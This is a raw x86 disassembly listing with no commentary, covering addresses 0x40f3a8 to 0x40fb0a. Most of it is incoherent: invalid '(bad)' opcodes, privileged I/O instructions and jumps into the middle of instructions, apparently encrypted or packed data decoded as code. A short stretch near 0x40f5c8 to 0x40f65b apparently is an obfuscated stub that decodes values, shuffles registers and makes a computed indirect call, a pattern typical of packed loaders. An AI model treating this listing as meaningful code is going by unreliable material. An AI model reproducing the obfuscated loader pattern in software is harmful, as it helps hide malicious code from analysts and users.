  40f3a8:	ds push edi
  40f3aa:	sub    ebx,ebx
  40f3ac:	mov    esi,0x6e9636b1
  40f3b1:	fcomp  QWORD PTR [edx+0x4739752]
  40f3b7:	adc    ch,bh
  40f3b9:	jge    0x40f361
  40f3bb:	cdq    
  40f3bc:	sbb    al,0xba
  40f3be:	pushf  
  40f3bf:	jno    0x40f36c
  40f3c1:	mov    ds:0xb5b2b42f,eax
  40f3c6:	dec    edi
  40f3c7:	das    
  40f3c8:	inc    di
  40f3ca:	adc    BYTE PTR [edx-0x65928a08],bl
  40f3d0:	lea    esi,[ebx+0x1622cf4f]
  40f3d6:	inc    esp
  40f3d7:	mov    cl,0xfa
  40f3d9:	jge    0x40f366
  40f3db:	retf   
  40f3dc:	aas    
  40f3dd:	push   esp
  40f3de:	sbb    DWORD PTR [edx+ecx*2+0x1a],esp
  40f3e2:	fcmovb st,st(7)
  40f3e4:	mov    al,0xce
  40f3e6:	cmp    ch,BYTE PTR [ebp+0x6d4b6665]
  40f3ec:	scas   eax,DWORD PTR es:[edi]
  40f3ed:	lahf   
  40f3ee:	pop    edi
  40f3ef:	(bad)  
  40f3f0:	cvttps2pi mm0,xmm2
  40f3f3:	clc    
  40f3f4:	xchg   ebp,eax
  40f3f5:	jns    0x40f380
  40f3f7:	mov    esp,gs
  40f3f9:	mul    BYTE PTR [eax-0x3af10ca0]
  40f3ff:	rcr    DWORD PTR [ebp-0x36],cl
  40f402:	dec    esp
  40f403:	lahf   
  40f404:	add    eax,0x896b0b89
  40f409:	popf   
  40f40a:	jmp    FWORD PTR [ebp+0x13]
  40f40d:	xchg   edx,eax
  40f40e:	out    0x4e,eax
  40f410:	repnz imul eax,edx,0x3a49b4b7
  40f417:	ror    BYTE PTR [edx-0x21b4360f],cl
  40f41d:	call   0xefa5:0x33eb
  40f423:	push   esi
  40f424:	inc    edi
  40f425:	add    ebp,DWORD PTR [esi]
  40f427:	hlt    
  40f428:	sub    BYTE PTR [esi],dh
  40f42a:	xor    esp,edi
  40f42c:	add    al,dl
  40f42e:	sti    
  40f42f:	dec    esi
  40f430:	xchg   BYTE PTR [edx],ch
  40f432:	std    
  40f433:	inc    ebp
  40f434:	inc    esp
  40f435:	jge    0x40f490
  40f437:	jo     0x40f450
  40f439:	xor    ah,cl
  40f43b:	repz xor BYTE PTR [eax+0x161538fd],dh
  40f442:	lea    esi,[ebx+0x73]
  40f445:	enter  0x371e,0x9b
  40f449:	iret   
  40f44a:	ja     0x40f40a
  40f44c:	jg     0x40f3ff
  40f44e:	fcmovb st,st(5)
  40f450:	lea    edx,[ebx-0xd621349]
  40f456:	ret    0x626f
  40f459:	jg     0x40f43c
  40f45b:	mov    al,0xa3
  40f45d:	xchg   esp,eax
  40f45e:	sub    eax,eax
  40f460:	lahf   
  40f461:	xchg   ebp,eax
  40f462:	aas    
  40f463:	ins    BYTE PTR es:[edi],dx
  40f464:	pop    esi
  40f465:	inc    esi
  40f466:	xchg   ebx,eax
  40f467:	push   cs
  40f468:	dec    ebp
  40f469:	js     0x40f4b2
  40f46b:	rcr    BYTE PTR [edx+0x2c3cfb55],cl
  40f471:	mov    esp,0x71dddb9d
  40f476:	pop    edi
  40f477:	(bad)  
  40f478:	sbb    BYTE PTR [ebp+0x604ed54d],ah
  40f47e:	or     BYTE PTR [ebx+0xce4cc0a],al
  40f484:	or     DWORD PTR [edi],ebx
  40f486:	mov    ds:0x5cdc899a,eax
  40f48b:	pop    ebx
  40f48c:	add    eax,0x152fcf7d
  40f491:	in     al,dx
  40f492:	fbstp  TBYTE PTR [edx+0x35]
  40f495:	or     eax,0xfe426abb
  40f49a:	pop    ebx
  40f49b:	or     al,0x57
  40f49d:	xor    al,0x99
  40f49f:	je     0x40f44d
  40f4a1:	jmp    0x40f4cd
  40f4a3:	cld    
  40f4a4:	pop    ss
  40f4a5:	mov    eax,ds:0x83db7db1
  40f4aa:	mov    dh,0xbf
  40f4ac:	and    DWORD PTR [edi],esi
  40f4ae:	ret    0x71e0
  40f4b1:	call   0x9384ac94
  40f4b6:	fild   WORD PTR ds:0x21e26496
  40f4bc:	rcl    dl,1
  40f4be:	pop    ecx
  40f4bf:	xchg   edx,eax
  40f4c0:	mov    edx,0x202f156e
  40f4c5:	dec    ebx
  40f4c6:	leave  
  40f4c7:	cmp    eax,0x6b63b27d
  40f4cc:	xlat   BYTE PTR ds:[ebx]
  40f4cd:	hlt    
  40f4ce:	mov    ah,0xd1
  40f4d0:	sti    
  40f4d1:	adc    al,0x88
  40f4d3:	mov    edx,0x3008bbcb
  40f4d8:	scas   al,BYTE PTR es:[edi]
  40f4d9:	push   cs
  40f4da:	or     al,0xe7
  40f4dc:	and    esp,edi
  40f4de:	ss push esi
  40f4e0:	es cwde 
  40f4e2:	cmc    
  40f4e3:	xor    eax,0x9d7f06bd
  40f4e8:	pop    es
  40f4e9:	xor    eax,0x9437f373
  40f4ee:	adc    edx,DWORD PTR [edi]
  40f4f0:	jge    0x40f50d
  40f4f2:	mov    ebp,0x5183ba62
  40f4f7:	and    cl,BYTE PTR [edi]
  40f4f9:	push   edx
  40f4fa:	or     DWORD PTR ds:0xd28ec67b,eax
  40f500:	js     0x40f4df
  40f502:	mov    BYTE PTR [esi],ah
  40f504:	sti    
  40f505:	rcl    BYTE PTR [edx+0x48d23c1b],cl
  40f50b:	mov    edi,0x9114bb6
  40f510:	cmp    ebp,DWORD PTR [ebp-0x6b997d63]
  40f516:	or     eax,0xd3753cfd
  40f51b:	outs   dx,DWORD PTR ds:[esi]
  40f51c:	cmp    esp,DWORD PTR [ecx+0x60]
  40f51f:	mov    ebx,0x7b3b70e5
  40f524:	out    dx,al
  40f525:	xchg   ebx,eax
  40f526:	push   esi
  40f527:	adc    edx,esp
  40f529:	neg    BYTE PTR [ebx+0x71]
  40f52c:	lea    esi,fs:[ebx+0x7b70cb65]
  40f533:	fcom   QWORD PTR [edx+0x29]
  40f536:	sahf   
  40f537:	(bad)  
  40f538:	jmp    0x40f4f4
  40f53a:	int    0xc9
  40f53c:	xchg   edx,eax
  40f53d:	cmp    al,dh
  40f53f:	lods   al,BYTE PTR ds:[esi]
  40f540:	lods   al,BYTE PTR ds:[esi]
  40f541:	test   BYTE PTR [edx+0x62237dd4],bl
  40f547:	add    al,0x8a
  40f549:	dec    esi
  40f54a:	sub    al,0x58
  40f54c:	push   ebp
  40f54d:	adc    bl,0xb0
  40f550:	inc    edx
  40f551:	xor    DWORD PTR [eax+0x4],esp
  40f554:	xchg   esi,eax
  40f555:	sbb    edi,ebp
  40f557:	sbb    ah,BYTE PTR [ebp+0xa085ec6]
  40f55d:	push   esp
  40f55e:	inc    ebp
  40f55f:	(bad)  
  40f560:	out    dx,eax
  40f561:	int3   
  40f562:	jbe    0x40f5cf
  40f564:	js     0x40f508
  40f566:	jb     0x40f5d4
  40f568:	fnop   
  40f56a:	push   ebx
  40f56b:	cmp    BYTE PTR [eax-0x7c],al
  40f56e:	lods   eax,DWORD PTR ds:[esi]
  40f56f:	pop    es
  40f570:	cdq    
  40f571:	mov    edx,0xfcb3bee2
  40f576:	or     eax,0x3e6bf13b
  40f57b:	enter  0x1093,0xfa
  40f57f:	pop    ebp
  40f580:	pop    ebp
  40f581:	std    
  40f582:	mov    ecx,ss
  40f584:	imul   eax,esp,0xffffffa0
  40f587:	pop    esp
  40f588:	xor    cl,BYTE PTR [edi-0x64181283]
  40f58e:	popf   
  40f58f:	test   eax,0x9db32b00
  40f594:	mov    dh,0xe0
  40f596:	xchg   edx,eax
  40f597:	fcom   QWORD PTR [esp+esi*2]
  40f59a:	push   edi
  40f59b:	mov    eax,0x357b52b9
  40f5a0:	push   esp
  40f5a1:	(bad)  [esi+0x45]
  40f5a4:	xchg   edi,eax
  40f5a5:	repnz add al,dl
  40f5a8:	pusha  
  40f5a9:	dec    edx
  40f5aa:	dec    ecx
  40f5ab:	inc    edi
  40f5ac:	sub    DWORD PTR [edi-0x4b],edx
  40f5af:	adc    cl,BYTE PTR [ecx+0x65]
  40f5b2:	xchg   edx,eax
  40f5b3:	into   
  40f5b4:	pop    esp
  40f5b5:	das    
  40f5b6:	or     al,0x18
  40f5b8:	imul   ebx,DWORD PTR [esi-0x6ed994d8],0xffffffff
  40f5bf:	push   ecx
  40f5c0:	mov    bl,0x3d
  40f5c2:	hlt    
  40f5c3:	jge    0x40f604
  40f5c5:	je     0x40f5fa
  40f5c7:	into   
  40f5c8:	lea    eax,[ecx+eax*1+0x3272f1]
  40f5cf:	mov    ecx,DWORD PTR [ebp+0x8]
  40f5d2:	mov    edx,DWORD PTR [ebp-0x20]
  40f5d5:	mov    DWORD PTR [edx+ecx*4],eax
  40f5d8:	mov    eax,DWORD PTR [ebp-0xc]
  40f5db:	mov    ecx,DWORD PTR [ebp+0x8]
  40f5de:	xor    eax,esi
  40f5e0:	lea    eax,[eax+ecx*1+0x3272f1]
  40f5e7:	mov    DWORD PTR [ebp+0x8],eax
  40f5ea:	mov    eax,DWORD PTR [ebp-0xc]
  40f5ed:	mov    ecx,DWORD PTR [ebp+0x14]
  40f5f0:	xor    eax,esi
  40f5f2:	add    eax,edi
  40f5f4:	imul   eax,DWORD PTR [ecx]
  40f5f7:	mov    ecx,DWORD PTR [ebp-0x4]
  40f5fa:	mov    edx,DWORD PTR [ebp+0x8]
  40f5fd:	xor    ecx,esi
  40f5ff:	lea    ecx,[ecx+edx*1+0x3272f1]
  40f606:	cmp    ecx,eax
  40f608:	jne    0x40d220
  40f60e:	mov    eax,DWORD PTR [ebp-0x4]
  40f611:	xor    eax,esi
  40f613:	add    eax,edi
  40f615:	mov    DWORD PTR [ebp-0x10],eax
  40f618:	mov    ebx,0x65655
  40f61d:	add    ebx,0x3234
  40f623:	xchg   ebx,esi
  40f625:	xor    ebx,ebx
  40f627:	push   esi
  40f628:	mov    esi,ebx
  40f62a:	pop    ebx
  40f62b:	mov    edx,esi
  40f62d:	add    ebx,0x1002
  40f633:	lea    eax,[ebp-0x18]
  40f636:	add    edx,eax
  40f638:	add    edx,0x5
  40f63b:	push   edx
  40f63c:	inc    esi
  40f63d:	pop    ecx
  40f63e:	dec    ecx
  40f63f:	xchg   ecx,eax
  40f640:	dec    eax
  40f641:	xchg   ecx,eax
  40f642:	dec    ecx
  40f643:	xchg   ecx,edx
  40f645:	dec    edx
  40f646:	push   edx
  40f647:	mov    edx,ebx
  40f649:	pop    ebx
  40f64a:	dec    ebx
  40f64b:	call   DWORD PTR [ebx]
  40f64d:	cmp    DWORD PTR [ebp+0x10],esi
  40f650:	je     0x413d8d
  40f656:	xchg   edx,eax
  40f657:	push   0xc
  40f659:	pop    ecx
  40f65a:	dec    ecx
  40f65b:	jmp    0x4119e9
  40f660:	test   al,0x3a
  40f662:	jl     0x40f606
  40f664:	out    dx,al
  40f665:	mov    ds:0xdb3d32a2,al
  40f66a:	sti    
  40f66b:	loopne 0x40f6b6
  40f66d:	call   0xafbafb0c
  40f672:	add    DWORD PTR [ebx-0x7c7ca1f4],0x37
  40f679:	(bad)  [ebp+0x5068c3e2]
  40f67f:	dec    esi
  40f680:	stc    
  40f681:	lea    edx,[esi]
  40f683:	push   es
  40f684:	inc    esp
  40f685:	in     eax,dx
  40f686:	jge    0x40f700
  40f688:	mov    al,0xc7
  40f68a:	aad    0xef
  40f68c:	dec    edx
  40f68d:	(bad)  
  40f68e:	scas   al,BYTE PTR es:[edi]
  40f68f:	dec    esp
  40f690:	dec    edi
  40f691:	jecxz  0x40f687
  40f693:	xchg   DWORD PTR [edi-0x481b2640],ecx
  40f699:	rcl    BYTE PTR [eax],0xb9
  40f69c:	jge    0x40f6cb
  40f69e:	in     al,dx
  40f69f:	ret    0x4279
  40f6a2:	cmp    esi,esi
  40f6a4:	push   ebx
  40f6a5:	outs   dx,BYTE PTR ds:[esi]
  40f6a6:	add    BYTE PTR [ecx+0x548a6c5b],dh
  40f6ac:	jmp    0xe24e2f26
  40f6b1:	out    0x20,eax
  40f6b3:	(bad)  
  40f6b4:	jnp    0x40f669
  40f6b6:	xor    cl,BYTE PTR [esi]
  40f6b8:	pusha  
  40f6b9:	push   edx
  40f6ba:	inc    ebp
  40f6bb:	jmp    0xcf472498
  40f6c0:	add    al,0x6
  40f6c2:	mov    ds:0xc4670bd7,al
  40f6c7:	pavgb  mm0,QWORD PTR [esi]
  40f6ca:	add    al,0xc4
  40f6cc:	jb     0x40f71f
  40f6ce:	pop    esp
  40f6cf:	fcom   DWORD PTR [ebp-0xd]
  40f6d2:	or     DWORD PTR ss:[ebx+0x2eda6473],ecx
  40f6d9:	addr16 loopne 0x40f65f
  40f6dc:	ficom  DWORD PTR [ebx+0x3dfddff7]
  40f6e2:	jmp    0x40f6d2
  40f6e4:	retf   0xe13f
  40f6e7:	xchg   BYTE PTR [edx+0x7424659d],bh
  40f6ed:	and    DWORD PTR [edx+0x7c526dd5],edi
  40f6f3:	repz inc ecx
  40f6f5:	outs   dx,BYTE PTR ds:[esi]
  40f6f6:	adc    BYTE PTR [ebp+0x577a6fe1],0x38
  40f6fd:	mov    ah,0xbb
  40f6ff:	inc    edx
  40f700:	in     al,dx
  40f701:	pop    ds
  40f702:	adc    edx,DWORD PTR [esi]
  40f704:	xor    dl,BYTE PTR [edi]
  40f706:	xchg   esi,eax
  40f707:	jbe    0x40f763
  40f709:	dec    ecx
  40f70a:	nop
  40f70b:	shl    BYTE PTR ds:0x6584b1bc,1
  40f711:	mov    eax,DWORD PTR [ebx+0x25]
  40f714:	dec    ebx
  40f715:	pop    ss
  40f716:	push   cs
  40f717:	push   DWORD PTR [ebx+0x7d94150a]
  40f71d:	xchg   ecx,eax
  40f71e:	and    BYTE PTR [ebp-0x16bfc7db],cl
  40f724:	jp     0x40f702
  40f726:	push   ebx
  40f727:	add    BYTE PTR [eax+0x17],bh
  40f72a:	sub    edi,DWORD PTR [ecx-0x7b]
  40f72d:	stc    
  40f72e:	push   esp
  40f72f:	inc    esi
  40f730:	shl    BYTE PTR [ecx-0x19622df1],1
  40f736:	and    edx,ebx
  40f738:	ins    DWORD PTR es:[edi],dx
  40f739:	jl     0x40f716
  40f73b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f73c:	(bad)  
  40f73d:	leave  
  40f73e:	jne    0x40f6c8
  40f740:	xor    bl,BYTE PTR [ebp-0x52]
  40f743:	fcmovu st,st(6)
  40f745:	add    BYTE PTR [edx+0x52f75879],ch
  40f74b:	cli    
  40f74c:	out    0xb2,al
  40f74e:	jmp    0x40f6ec
  40f750:	icebp  
  40f751:	or     eax,0xad35e88f
  40f756:	(bad)  [edi+0x47]
  40f759:	push   ebp
  40f75a:	dec    esp
  40f75b:	and    eax,0x4c06457b
  40f760:	in     eax,0x5
  40f762:	std    
  40f763:	fldenv [edi+0x3f]
  40f766:	test   al,0xd
  40f768:	into   
  40f769:	imul   esp,DWORD PTR [ebp+0x39],0x53dfb94b
  40f770:	cmp    edi,DWORD PTR [edx+esi*1-0x7167fda4]
  40f777:	mov    ds:0x944518d,eax
  40f77c:	out    dx,eax
  40f77d:	sti    
  40f77e:	cld    
  40f77f:	mov    ds:0x90aa3410,eax
  40f784:	(bad)  
  40f785:	mov    cl,0x96
  40f787:	bound  edi,QWORD PTR [edi-0x61c605b2]
  40f78d:	mov    ds:0xa0a8d87a,al
  40f792:	pushf  
  40f793:	inc    edx
  40f794:	lds    eax,FWORD PTR [ecx+0x1463e547]
  40f79a:	call   0xc92f6315
  40f79f:	popa   
  40f7a0:	sahf   
  40f7a1:	add    ecx,DWORD PTR [ecx+0x624ea58e]
  40f7a7:	mov    BYTE PTR [edx],ah
  40f7a9:	ds push esi
  40f7ab:	jmp    0x40f770
  40f7ad:	call   0xdd5f49c
  40f7b2:	aas    
  40f7b3:	xor    BYTE PTR [esi+0x20398ef0],al
  40f7b9:	dec    edi
  40f7ba:	push   ds
  40f7bb:	ret    
  40f7bc:	mov    esp,ss
  40f7be:	pop    ss
  40f7bf:	jp     0x40f801
  40f7c1:	daa    
  40f7c2:	pop    edi
  40f7c3:	or     DWORD PTR [esi],0xffffffea
  40f7c6:	xchg   ebx,eax
  40f7c7:	mov    dl,0xd2
  40f7c9:	dec    ecx
  40f7ca:	inc    eax
  40f7cb:	jp     0x40f78f
  40f7cd:	daa    
  40f7ce:	push   cs
  40f7cf:	jno    0x40f837
  40f7d1:	jge    0x40f7cb
  40f7d3:	iret   
  40f7d4:	rcl    DWORD PTR [edi+edi*1+0x33],1
  40f7d8:	jnp    0x40f81b
  40f7da:	jb     0x40f855
  40f7dc:	inc    ecx
  40f7dd:	sub    eax,0x6a452719
  40f7e2:	aad    0x8e
  40f7e4:	pop    eax
  40f7e5:	sahf   
  40f7e6:	or     dl,BYTE PTR [ebx+0x2f7ff5ae]
  40f7ec:	jnp    0x40f776
  40f7ee:	shr    BYTE PTR [ecx],cl
  40f7f0:	push   cs
  40f7f1:	mul    BYTE PTR [esi]
  40f7f3:	aam    0xe0
  40f7f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f7f6:	mov    DWORD PTR [eax-0x1dfb7213],0x946248fe
  40f800:	(bad)  [esi]
  40f802:	add    ebx,DWORD PTR [ebx+0x61c4037b]
  40f808:	fidivr WORD PTR [edx]
  40f80a:	and    BYTE PTR [ebx+ecx*1],ch
  40f80d:	dec    ebx
  40f80e:	push   0x55
  40f810:	outs   dx,BYTE PTR ds:[esi]
  40f811:	mov    esi,0xf3e6383b
  40f816:	xchg   esi,eax
  40f817:	ins    BYTE PTR es:[edi],dx
  40f818:	sub    edx,eax
  40f81a:	mov    ds:0x9150f934,al
  40f81f:	in     eax,0xfd
  40f821:	push   es
  40f822:	mov    cl,0x60
  40f824:	cmp    DWORD PTR [ebp+0x8],esp
  40f827:	xor    BYTE PTR [eax],al
  40f829:	cmp    edx,DWORD PTR ds:0x24e2a353
  40f82f:	outs   dx,DWORD PTR ds:[esi]
  40f830:	in     eax,dx
  40f831:	mov    DWORD PTR [edi-0x30],esi
  40f834:	cwde   
  40f835:	mov    ss,WORD PTR ds:0x32111c77
  40f83b:	enter  0x4a32,0x62
  40f83f:	out    dx,al
  40f840:	mov    al,BYTE PTR [edi-0x5363b4cb]
  40f846:	cmp    al,BYTE PTR [eax-0x10]
  40f849:	mov    edx,0xe292628
  40f84e:	popa   
  40f84f:	add    eax,0x9832a823
  40f854:	push   esp
  40f855:	dec    edx
  40f856:	cmp    esi,esi
  40f858:	test   DWORD PTR [ebp-0x24],esp
  40f85b:	fst    st(5)
  40f85d:	or     edx,DWORD PTR [ebp+0x6364fb2f]
  40f863:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f864:	or     DWORD PTR [ebp+0x65],0xffffffaf
  40f868:	and    ebx,DWORD PTR [edx+edx*1+0x6cc05d1]
  40f86f:	or     bl,BYTE PTR [ebp+0x26]
  40f872:	dec    eax
  40f873:	add    edx,DWORD PTR [ebx-0x1328f2cc]
  40f879:	mov    ebx,0xcf4ad07b
  40f87e:	jne    0x40f8a5
  40f880:	in     eax,0x74
  40f882:	data16 adc dl,BYTE PTR [esi-0x59]
  40f886:	dec    edx
  40f887:	test   BYTE PTR [edx-0x80],bh
  40f88a:	jge    0x40f8c6
  40f88c:	mov    eax,ds:0x4036c98f
  40f891:	pop    esi
  40f892:	xchg   esi,eax
  40f893:	xor    DWORD PTR [eax-0x3d65e48],0xffffff81
  40f89a:	push   es
  40f89b:	ins    DWORD PTR es:[edi],dx
  40f89c:	fisub  DWORD PTR [edi-0x7517e9dd]
  40f8a2:	inc    edx
  40f8a3:	inc    edx
  40f8a4:	scas   eax,DWORD PTR es:[edi]
  40f8a5:	outs   dx,DWORD PTR ds:[esi]
  40f8a6:	push   edx
  40f8a7:	xchg   esi,eax
  40f8a8:	adc    cl,0x35
  40f8ab:	es std 
  40f8ad:	ud1    edx,edx
  40f8b0:	loopne 0x40f8c9
  40f8b2:	fiadd  DWORD PTR [ecx]
  40f8b4:	xchg   BYTE PTR [esi+0x3e4c7458],cl
  40f8ba:	out    0x89,al
  40f8bc:	dec    ebp
  40f8bd:	push   0xffffffb4
  40f8bf:	xor    eax,0x37b5e5e9
  40f8c4:	push   ebx
  40f8c5:	(bad)  [ecx]
  40f8c7:	stc    
  40f8c8:	in     al,dx
  40f8c9:	fucomp st(4)
  40f8cb:	jp     0x40f871
  40f8cd:	sub    ebx,DWORD PTR [edi]
  40f8cf:	jns    0x40f94d
  40f8d1:	mov    ah,0xe4
  40f8d3:	push   ebp
  40f8d4:	mov    dl,BYTE PTR [ebp+0x1c]
  40f8d7:	lock clc 
  40f8d9:	pop    es
  40f8da:	aas    
  40f8db:	push   ecx
  40f8dc:	out    dx,al
  40f8dd:	pusha  
  40f8de:	in     eax,dx
  40f8df:	aad    0x5c
  40f8e1:	div    BYTE PTR [edx+eax*4]
  40f8e4:	xor    dl,bh
  40f8e6:	ins    DWORD PTR es:[edi],dx
  40f8e7:	dec    ebx
  40f8e8:	fisub  WORD PTR [ecx]
  40f8ea:	add    BYTE PTR [edi],bh
  40f8ec:	hlt    
  40f8ed:	in     al,dx
  40f8ee:	mov    al,ds:0xb19ca6d7
  40f8f3:	cwde   
  40f8f4:	and    BYTE PTR [ebx-0x50],dl
  40f8f7:	jle    0x40f962
  40f8f9:	fstp   TBYTE PTR [ecx-0x3f]
  40f8fc:	inc    edi
  40f8fd:	fdiv   DWORD PTR [edx]
  40f900:	inc    esp
  40f901:	sbb    ebp,DWORD PTR [edi-0x79]
  40f904:	popa   
  40f905:	std    
  40f906:	mov    esi,0xa67128d5
  40f90b:	mov    ebp,0xea69c4ad
  40f910:	in     al,dx
  40f911:	clc    
  40f912:	push   ebx
  40f913:	sub    ebp,ecx
  40f915:	iret   
  40f916:	in     al,dx
  40f917:	mov    ds,WORD PTR [esi-0x795180ad]
  40f91d:	fmul   QWORD PTR [eax-0x25]
  40f920:	pop    esp
  40f921:	repnz test eax,0x3443aa6d
  40f927:	inc    ebx
  40f928:	cmp    ah,bl
  40f92a:	or     ah,ah
  40f92c:	sub    ecx,DWORD PTR [edx]
  40f92e:	in     al,dx
  40f92f:	jb     0x40f95b
  40f931:	inc    esp
  40f932:	xor    ebx,0x9603047f
  40f938:	adc    eax,0x92e29df
  40f93d:	push   cs
  40f93e:	pop    esi
  40f93f:	jb     0x40f8f9
  40f941:	ss pop es
  40f943:	std    
  40f944:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f945:	jmp    0x40f8fd
  40f947:	adc    al,BYTE PTR [ebx+ecx*4]
  40f94a:	cld    
  40f94b:	jecxz  0x40f98e
  40f94d:	cmp    dl,dl
  40f94f:	jnp    0x40f8dd
  40f951:	gs aas 
  40f953:	mov    bl,0x78
  40f955:	dec    ebx
  40f956:	repnz mov eax,0x85229ed4
  40f95c:	in     al,dx
  40f95d:	fdiv   DWORD PTR [esi]
  40f95f:	arpl   WORD PTR [ecx+ecx*4],cx
  40f962:	push   eax
  40f963:	xor    al,BYTE PTR [esi]
  40f965:	enter  0x13f8,0xd2
  40f969:	sbb    ebx,DWORD PTR ds:0xae0cc787
  40f96f:	cdq    
  40f970:	jle    0x40f9ad
  40f972:	sbb    BYTE PTR [eax-0x2662425],al
  40f978:	jg     0x40f92b
  40f97a:	push   ebp
  40f97b:	ins    BYTE PTR es:[edi],dx
  40f97c:	pop    es
  40f97d:	test   DWORD PTR [ecx],ecx
  40f97f:	fild   WORD PTR [esi+esi*4]
  40f982:	outs   dx,DWORD PTR ds:[esi]
  40f983:	cwde   
  40f984:	mov    eax,ds:0xd4bde6ae
  40f989:	popf   
  40f98a:	mov    ah,0x10
  40f98c:	mov    bh,0x94
  40f98e:	stc    
  40f98f:	sbb    eax,0x3815bd31
  40f994:	sti    
  40f995:	fld    QWORD PTR [bp+di-0x6cea]
  40f99a:	mov    bh,0xa2
  40f99c:	mov    eax,ds:0xf4ee9ce4
  40f9a1:	out    0x56,eax
  40f9a3:	push   ecx
  40f9a4:	jbe    0x40f984
  40f9a6:	push   ebp
  40f9a7:	xchg   esp,eax
  40f9a8:	sahf   
  40f9a9:	test   DWORD PTR [esp+ecx*4],edi
  40f9ac:	call   0x753f:0x600b6b6c
  40f9b3:	stos   DWORD PTR es:[edi],eax
  40f9b4:	into   
  40f9b5:	push   ecx
  40f9b6:	stc    
  40f9b7:	rcr    DWORD PTR [edx+0xea4ac93],cl
  40f9bd:	ja     0x40fa34
  40f9bf:	xchg   ebx,eax
  40f9c0:	loopne 0x40f985
  40f9c2:	scas   al,BYTE PTR es:[edi]
  40f9c3:	lock (bad) 
  40f9c5:	frstor [ecx+0x12377de1]
  40f9cb:	fwait
  40f9cc:	pop    edi
  40f9cd:	xchg   ebx,eax
  40f9ce:	sahf   
  40f9cf:	pushf  
  40f9d0:	cmp    esi,eax
  40f9d2:	cwde   
  40f9d3:	pop    ss
  40f9d4:	cmp    eax,DWORD PTR [edx-0x24]
  40f9d7:	xchg   BYTE PTR [edi-0x663bc140],ah
  40f9dd:	aas    
  40f9de:	jge    0x40f9a5
  40f9e0:	ret    0x36e2
  40f9e3:	pop    esi
  40f9e4:	mov    edi,0xa8dc4d0
  40f9e9:	icebp  
  40f9ea:	mov    ecx,0x1e5ed3a4
  40f9ef:	loope  0x40f9fa
  40f9f1:	adc    edx,edx
  40f9f3:	jns    0x40f977
  40f9f5:	arpl   WORD PTR [ecx+0x59],ax
  40f9f8:	pop    ss
  40f9f9:	sub    esi,ecx
  40f9fb:	mov    bh,0x1e
  40f9fd:	or     dl,BYTE PTR [ecx+0x47]
  40fa00:	mov    ch,BYTE PTR [ebx+ebx*1-0x2]
  40fa04:	aad    0x73
  40fa06:	sbb    ebp,DWORD PTR [ebp+0x14]
  40fa09:	xchg   cl,dh
  40fa0b:	mov    al,ds:0x72a15f5b
  40fa10:	stos   DWORD PTR es:[edi],eax
  40fa11:	xchg   ebp,eax
  40fa12:	out    dx,al
  40fa13:	mov    dl,0x77
  40fa15:	call   0x20e25c18
  40fa1a:	xchg   edx,eax
  40fa1b:	push   dx
  40fa1d:	retf   0x4db0
  40fa20:	xlat   BYTE PTR ds:[ebx]
  40fa21:	mov    ch,0x5d
  40fa23:	(bad)  
  40fa24:	push   ebx
  40fa25:	aad    0x8e
  40fa27:	rcr    BYTE PTR [ebx-0x3922f195],cl
  40fa2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fa2e:	pop    es
  40fa2f:	dec    esi
  40fa30:	stos   DWORD PTR es:[edi],eax
  40fa31:	mov    dl,0xbe
  40fa33:	adc    eax,0x7d8854b1
  40fa38:	cmp    eax,0x1523ea75
  40fa3d:	fsubr  st,st(7)
  40fa3f:	ret    0x10d8
  40fa42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa43:	push   cs
  40fa44:	loope  0x40fa9f
  40fa46:	fisttp QWORD PTR [ebp-0x23139c98]
  40fa4c:	ins    DWORD PTR es:[edi],dx
  40fa4d:	xor    dl,dl
  40fa4f:	mov    DWORD PTR [ebx-0x62],ebp
  40fa52:	arpl   si,sp
  40fa54:	sub    eax,0xb5fbdbcb
  40fa59:	dec    ebx
  40fa5a:	jl     0x40fa79
  40fa5c:	xor    eax,0x37ece980
  40fa61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fa62:	sbb    eax,0x1349f77b
  40fa67:	ins    DWORD PTR es:[edi],dx
  40fa68:	call   0x1a65:0xa835735c
  40fa6f:	pushf  
  40fa70:	arpl   WORD PTR [edx-0x1feda112],bx
  40fa76:	xchg   edx,eax
  40fa77:	jge    0x40fa4c
  40fa79:	adc    DWORD PTR [ebp+0x16],esi
  40fa7c:	not    DWORD PTR [edi-0x2b]
  40fa7f:	mov    eax,ds:0x2eb797b9
  40fa84:	jb     0x40fabe
  40fa86:	jae    0x40fa43
  40fa88:	outs   dx,BYTE PTR ds:[esi]
  40fa89:	or     edi,DWORD PTR [esi-0x63]
  40fa8c:	inc    edx
  40fa8d:	retf   0xcb85
  40fa90:	jmp    0x40fa3d
  40fa92:	cli    
  40fa93:	leave  
  40fa94:	fist   WORD PTR [edx-0x1e]
  40fa97:	outs   dx,BYTE PTR ds:[esi]
  40fa98:	repz mov WORD PTR ds:0xb05559d2,fs
  40fa9f:	cs int 0xfe
  40faa2:	ins    DWORD PTR es:[edi],dx
  40faa3:	not    DWORD PTR [edi]
  40faa5:	shr    DWORD PTR [esi+0xd7048ec],0xbb
  40faac:	mov    cl,0x1
  40faae:	mov    ds:0x957b50fd,al
  40fab3:	aas    
  40fab4:	sub    dh,BYTE PTR [eax-0x7c]
  40fab7:	inc    edx
  40fab8:	fsub   st(1),st
  40faba:	mov    al,ds:0xcc5cab8d
  40fabf:	mov    edi,0x582f4861
  40fac4:	and    DWORD PTR [edx],esi
  40fac6:	in     eax,dx
  40fac7:	adc    eax,0x8a620868
  40facc:	int    0x51
  40face:	mov    ds:0xc3762033,eax
  40fad3:	(bad)  
  40fad5:	rcl    BYTE PTR [ecx-0x160fc27c],1
  40fadb:	dec    eax
  40fadc:	daa    
  40fadd:	enter  0x2b26,0x4b
  40fae1:	inc    ebp
  40fae2:	mov    esi,DWORD PTR [edi]
  40fae4:	pop    ecx
  40fae5:	dec    esi
  40fae6:	mov    dl,0xe
  40fae8:	std    
  40fae9:	das    
  40faea:	sbb    al,0x80
  40faec:	(bad)  
  40faed:	sti    
  40faee:	fidiv  DWORD PTR [esi-0x1e170f23]
  40faf4:	lock sub eax,0x882b357e
  40fafa:	call   0x392d:0xc2d4ce13
  40fb01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb02:	call   0x2467:0xe2e5f337
  40fb09:	dec    ebx
  40fb0a:	pusha  
